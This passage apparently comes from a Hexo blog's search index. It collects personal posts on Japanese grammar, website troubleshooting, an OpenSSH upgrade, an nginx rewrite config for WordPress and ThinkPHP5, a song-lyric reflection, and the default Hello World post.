id="l—-表并列-和"><a href="#l—-表并列-和" class="headerlink" title="l— 表并列 和"></a>l<sub>— 表并列 和</h4><ul><li>机の上に本とノートがあります<br>  表示桌子上只有书和备忘录</li><li>机の上に本やノート[など(等)]があります<br>  表示桌子上有书、备忘录等</li></ul><h3 id="助詞「を」"><a href="#助詞「を」" class="headerlink" title="助詞「を」"></a>助詞「を」</h3><ul><li>表示动作作用对象(看得见的动作)　<br>対象 + を + 動作<br>例：日本語を勉強します</li></ul><h3 id="助詞「が」"><a href="#助詞「が」" class="headerlink" title="助詞「が」"></a>助詞「が」</h3><ul><li>対象 + が（表示焦点）+ 状態動詞　<br>例：日本語が分かります<br>&emsp;&emsp;私はお金が全然ありません</li></ul><h3 id="時制"><a href="#時制" class="headerlink" title="時制"></a>時制</h3><table><thead><tr><th align="center">-</th><th align="center">肯定</th><th align="center">否定</th></tr></thead><tbody><tr><td align="center">現在</td><td align="center">〜ます</td><td align="center">〜ません</td></tr><tr><td align="center">過去</td><td align="center">〜ました</td><td align="center">〜ませんでした</td></tr></tbody></table><h3 id="語気"><a href="#語気" class="headerlink" title="語気"></a>語気</h3><ul><li>ませんか<br>要不要</li></ul><p>例：一緒に[動詞]ませんか<br>&emsp;&emsp;ええ、[ ]ましょう<br>&emsp;&emsp;すみません、ちょっと…</p><h3 id="その他"><a href="#その他" class="headerlink" title="その他"></a>その他</h3><ul><li><p>歩いて<br>走路去</p></li><li><p>总是 いつも　经常 よく　有时候 時々</p></li><li><p>不常 あまり＿＿ません　完全不 全然＿＿ません</p></li><li><p>理由原因から、＿＿＿＿＿＿<br>例：お金がありませんから、どこも行きたくないです<br>&emsp;&emsp;日本のアニメが好きですから、日本語を勉強します<br>&emsp;&emsp;a：どうして、昨日、学校へ来ませんですか<br>&emsp;&emsp;b：疲れましたから</p></li><li><p>もう　已经<br>例：もう晩ご飯を食べましたか<br>&emsp;&emsp;はい、もう食べました<br>&emsp;&emsp;いいえ、まだです<br>&emsp;&emsp;20時ですね、もう帰ります<br>&emsp;&emsp;a：もうあの映画を見ましたか<br>&emsp;&emsp;b：いいえ、まだです。明日友達と見ます<br>&emsp;&emsp;a：21時ですよ、帰りませんか<br>&emsp;&emsp;b：そうですね、帰りましょう</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 勉強 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 勉強 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>some issue</title>
      <link href="2019/06/27/some_issue/"/>
      <url>2019/06/27/some_issue/</url>
      
        <content type="html"><![CDATA[<h3 id="官网访问相关"><a href="#官网访问相关" class="headerlink" title="官网访问相关"></a>官网访问相关</h3><p>检查内外网, vpn情况下的访问情况, 以此来粗略判断是否为waf拦截<br>[案例1]: 官网外网无法访问, 内网可以或vpn可以, 说明网站没有问题, 可以推测下是waf拦截</p><p>检查118 119 120的通信情况(ping)<br>[案例2]: 访问网站出现500错误, 通过ping发现120无法通信，也进不了shell， 登陆vsphere发现是集群的共享存储满了</p><p>检查 内存, cpu使用情况(top)<br>[案例3]: 官网主页上不去, 登陆118后发现有个程序跑满了cpu, 使用kill命令杀掉相关进程(kill前先确认下进程用途)</p><p>检查nginx,php-fpm的运行情况(ps -aux| grep xxx)<br>检查 硬盘使用情况 (df -h或vshpere)<br>查看 nginx, php日志文件<br>尝试对nginx ,php-fpm重启<br>尝试对服务器重启<br>如果xshell 无法连接服务器, 登陆vsphere 检查服务器储存空间是否已满</p><h3 id="挂载相关"><a href="#挂载相关" class="headerlink" title="挂载相关"></a>挂载相关</h3><p>官网上传文件失败, 图片不显示, /wp-content/uploads/无法建立目录等与挂载文件夹(一般是uploads文件夹)下的文件相关的问题<br>检查119的文件挂载是否成功(showmount -e)若没挂载成功, 重启服务器<br>如果要对/wp-content/uploads/的文件进行权限相关的操作,需要在119上进行处理, 118上无法进行</p><h3 id="恢复快照相关"><a href="#恢复快照相关" class="headerlink" title="恢复快照相关"></a>恢复快照相关</h3><p>刚刚快照恢复后, 可能会遇见网站部分功能失效,部分页面无法访问, 可能是文件挂载或数据库连接没有完全恢复, 建议等待30min~1h后再查看网站是否正常, 再进行下一步操作排查问题. 快照恢复和重启对官网访问会造成一定影响, 涉及到这类的操作做好晚上进行</p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Openssh upgrade, from 7.5 to 7.9</title>
      <link href="2019/06/24/Openssh%20upgrade,%20from%207.5%20to%207.9/"/>
      <url>2019/06/24/Openssh%20upgrade,%20from%207.5%20to%207.9/</url>
      
        <content type="html"><![CDATA[<h3 id="记一次OpenSSH升级过程"><a href="#记一次OpenSSH升级过程" class="headerlink" title="记一次OpenSSH升级过程"></a>记一次OpenSSH升级过程</h3><h3 id="系统环境-Ubuntu14-04"><a href="#系统环境-Ubuntu14-04" class="headerlink" title="系统环境: Ubuntu14.04"></a>系统环境: Ubuntu14.04</h3><ul><li><p>如果服务器并非采用云虚拟平台，最好先启用并测试SSH以外的连接方式（如Telnet）是否能够正常使用，如果SSH安装失败会连不上服务器（别问我怎么知道的…）</p></li><li><p>删除旧版本的openssh版本文件及旧版本的openssl（1、记得先备份好 2、如果zlib版本适应当前版本OpenSSH，可以不用更新）</p></li><li><p>Wget openssh7.9p1、openssl1.1.1 和 perl5.26安装包</p></li><li><p>先编译安装perl,记得备份旧的perl，再创造新的软链接<br>Perl -v进行测试</p></li><li><p>编译安装openssl，<br>openssl version测试不成功<br>到bin目录下./openssl version，报文件加载出错<br>备份并重新创建新的libssl.so.1.1和libcrypto.so.1.1软链接<br>再次bin目录下./openssl version成功<br>备份并创建新的openssl软链接<br>Openssl version进行测试</p></li><li><p>编译安装openssh</p></li><li><p>修改ssh配置文件允许root用户登录</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ゴーストルール</title>
      <link href="2019/06/24/%E3%82%B4%E3%83%BC%E3%82%B9%E3%83%88%E3%83%AB%E3%83%BC%E3%83%AB/"/>
      <url>2019/06/24/%E3%82%B4%E3%83%BC%E3%82%B9%E3%83%88%E3%83%AB%E3%83%BC%E3%83%AB/</url>
      
        <content type="html"><![CDATA[<h4 id="‘メーデー’の意味"><a href="#‘メーデー’の意味" class="headerlink" title="‘メーデー’の意味"></a>‘メーデー’の意味</h4><p>この前、ゴーストルールを聴きました、その歌詞の中　’メーデー’　があります<br>どういう意味なのか？　その意味について考えがあります。</p><p>グーグルで、このような言葉がある：<br>Mayday is an emergency procedure word used internationally as a distress signal in voice-procedure radio communications.</p><p>遭難信号のことですか？<br>エエエエエ、、全然分からない</p><p>最後にこのリンクを見つけました　<a href="https://music.branchwith.com/element/interpretation/go-sutoru-ru">ゴーストルール歌詞の意味</a><br>つまり、主人公は遭難していて、だれかに見つけてもらいたいと信号を送っているのです。</p><p>そんな遭難信号を送っておきながら、僕は見つけられても抱き締めなくていいと言っています。</p><p>一方で、僕に気づいたら笑いかけて欲しいと願っています。</p><p>これは、僕が抱きしめることのできない存在だということを言っているのではないでしょうか？</p>]]></content>
      
      
      <categories>
          
          <category> 小记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deploy WordPress, ThinkPHP5 and general system in Nginx</title>
      <link href="2019/06/24/maintence/"/>
      <url>2019/06/24/maintence/</url>
      
        <content type="html"><![CDATA[<h3 id="记一次Nginx上同时部署WordPress、-ThinkPHP5-和-普通系统，其中WordPress使用目录多站点"><a href="#记一次Nginx上同时部署WordPress、-ThinkPHP5-和-普通系统，其中WordPress使用目录多站点" class="headerlink" title="记一次Nginx上同时部署WordPress、 ThinkPHP5 和 普通系统，其中WordPress使用目录多站点"></a>记一次Nginx上同时部署WordPress、 ThinkPHP5 和 普通系统，其中WordPress使用目录多站点</h3><h5 id="这次系统部署主要遇到以下四个问题，以至于花费比较长的时间，但总的来说还是因为对nginx配置相对不熟练。"><a href="#这次系统部署主要遇到以下四个问题，以至于花费比较长的时间，但总的来说还是因为对nginx配置相对不熟练。" class="headerlink" title="这次系统部署主要遇到以下四个问题，以至于花费比较长的时间，但总的来说还是因为对nginx配置相对不熟练。"></a>这次系统部署主要遇到以下四个问题，以至于花费比较长的时间，但总的来说还是因为对nginx配置相对不熟练。</h5><ul><li>wordpress本身路由特点，wordpress在建站时会把网站的根地址存在数据库的wp_options表的siteurl、home、ossdl_off_cdn_url和ossdl_off_blog_url字段中，路由都是从数据库中读取。所以nginx无论怎么修改配置都是测试不了问题的。</li></ul><ul><li>wordpress域名多站点与目录多站点存在着不同之处，安装wp目录多站点时，必须要停用所有插件再开启。</li></ul><ul><li>wp目录多站点的重写规则，由于wp路由的特殊性，wp在nginx的配置会覆盖其他系统的配置，所以访问uri时必须首先重写其他系统的uri。又由于存在wp，tp5，以及原生系统，三种不同路由的规则，一开始服务器配置又经过许多人手，配置起来比较凌乱。</li></ul><ul><li>由于在编译安装nginx时，没有装上echo输出，在我们调试正则表达式规则重写uri时候带来了很多麻烦，需要改不同的正则表达式，然后查看log文件，站点访问情况等摸索它的重写规律。</li></ul><h4 id="以下是配置文件内容"><a href="#以下是配置文件内容" class="headerlink" title="以下是配置文件内容:"></a>以下是配置文件内容:</h4><h5 id="RoomReserver-是普通系统，tpmas是ThinkPHP5系统"><a href="#RoomReserver-是普通系统，tpmas是ThinkPHP5系统" class="headerlink" title="RoomReserver 是普通系统，tpmas是ThinkPHP5系统"></a>RoomReserver 是普通系统，tpmas是ThinkPHP5系统</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#RoomResever rewrite rule</span><br><span class="line">rewrite ^&#x2F;RoomReserve&#x2F;(.*)$ &#x2F;RoomReserve&#x2F;$1 break;</span><br><span class="line"></span><br><span class="line">#tpmas rewrite rule</span><br><span class="line">if ( $request_uri ~* &#x2F;tpmas&#x2F; ) &#123;</span><br><span class="line">    rewrite  ^&#x2F;tpmas&#x2F;public&#x2F;index.php&#x2F;(.*)$ &#x2F;tpmas&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;$1 last; break;</span><br><span class="line">#rewrite  ^&#x2F;tpmas&#x2F;public&#x2F;index.php&#x2F;(.*)$ &#x2F;tpmas&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;$1 last;  break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#wordpress rewrite rule</span><br><span class="line">rewrite ^&#x2F;([_0-9a-zA-Z-]+&#x2F;)?wp-admin$ &#x2F;$1wp-admin&#x2F; permanent;</span><br><span class="line"></span><br><span class="line">if (-f $request_filename)&#123;</span><br><span class="line">set $rule_2 1;</span><br><span class="line">&#125;</span><br><span class="line">if (-d $request_filename)&#123;</span><br><span class="line">set $rule_2 1;</span><br><span class="line">&#125;</span><br><span class="line">if ($rule_2 &#x3D; &quot;1&quot;)&#123;</span><br><span class="line">#ignored: “-” thing used or unknown variable in regex&#x2F;rew</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rewrite ^&#x2F;([_0-9a-zA-Z-]+&#x2F;)?(wp-(content|admin|includes).*) &#x2F;$2 last;</span><br><span class="line">rewrite ^&#x2F;([_0-9a-zA-Z-]+&#x2F;)?(.*.php)$ &#x2F;$2 last;</span><br><span class="line">rewrite &#x2F;. &#x2F;index.php last;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
          <category> Wordpress </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> Wordpress </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="2019/06/23/hello-world/"/>
      <url>2019/06/23/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
